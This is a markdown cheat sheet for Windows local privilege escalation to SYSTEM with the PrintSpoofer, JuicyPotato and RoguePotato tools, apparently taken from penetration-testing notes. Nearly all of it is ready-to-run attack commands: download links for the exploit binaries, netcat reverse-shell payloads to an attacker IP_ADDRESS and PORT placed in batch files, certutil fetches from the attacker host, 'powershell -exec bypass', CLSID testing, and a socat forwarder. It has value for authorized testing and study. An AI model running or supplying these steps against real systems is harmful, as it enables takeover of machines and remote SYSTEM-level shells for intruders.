# Exploit Potato

This is a Local Privilege Escalation tool to `NT AUTHORITY\SYSTEM`. For the exploit to work, the current user must have one of the following privileges `SeImpersonate` or `SeAssignPrimaryToken`.

- [Exploit Potato](#exploit-potato)
  - [PrintSpoofer](#printspoofer)
  - [JuicyPotato](#juicypotato)
    - [On the target](#on-the-target)
    - [If fail to fine valid CLSID](#if-fail-to-fine-valid-clsid)
  - [Rogue Potato](#rogue-potato)
    - [Run exploit](#run-exploit)
  - [Sources](#sources)

## PrintSpoofer

Binary source:

```bash
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

```bash
#From an interactive shell, spawn a SYSTEM shell
./PrintSpoofer.exe -i -c cmd

#Spawn a SYSTEM shell
./PrintSpoofer.exe -c "nc.exe IP_ADDRESS PORT -e C:\Windows\System32\cmd.exe"
```

## JuicyPotato

Binary source:

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe juicypotato.exe
```

### On the target

Create payload:

```batch
echo C:\Windows\Tasks\Wincat.exe IP_ADDRESS PORT > C:\Windows\Tasks\cmd.bat
```

or

```batch
echo C:\Windows\Tasks\nc.exe IP_ADDRESS PORT -e C:\Windows\System32\cmd.exe > C:\Windows\Tasks\cmd.bat
```

Exploit:

```batch
juicypotato.exe -l 1337 -p C:\Windows\Tasks\cmd.bat -t *
```

### If fail to fine valid CLSID

Clone full repo:

```batch
git clone https://github.com/ohpe/juicy-potato.git
```

Copy file to target host:

```batch
certutil -urlcache -split -f http://IP_ADDRESS/CLSID/GetCLSID.ps1 GetCLSID.ps1
certutil -urlcache -split -f http://IP_ADDRESS/CLSID/test_clsid.bat test_clsid.bat
```

Run test:

```batch
powershell -exec bypass GetCLSID.ps1
test_clsid.bat
```

if return 10001 -> the CLSID is valid

e.g.

```raw
{D6015EC3-FA16-4813-9CA1-DA204574F5DA} 10000
{c980e4c2-c178-4572-935d-a8a429884806} 10000        <-- Valid !!!
{F01D6448-0959-4E38-B6F6-B6643D4558FE} 10001
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 10001        <-- Valid !!!
{03ca98d6-ff5d-49b8-abc6-03dd84127020} 10002
```

Exploit

```raw
JuicyPotato.exe -l 1337 -p payload.bat -t * -c {CLSID}
```

## Rogue Potato

Run the port forwarder

```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
```

### Run exploit

```cmd
RoguePotato.exe -r L_IP_ADDRESS -e payload.bat -l 9999
```

## Sources

- <https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all>
- <https://github.com/ohpe/juicy-potato>
- <https://github.com/itm4n/PrintSpoofer>
- <https://github.com/breenmachine/RottenPotatoNG>
- <https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html>
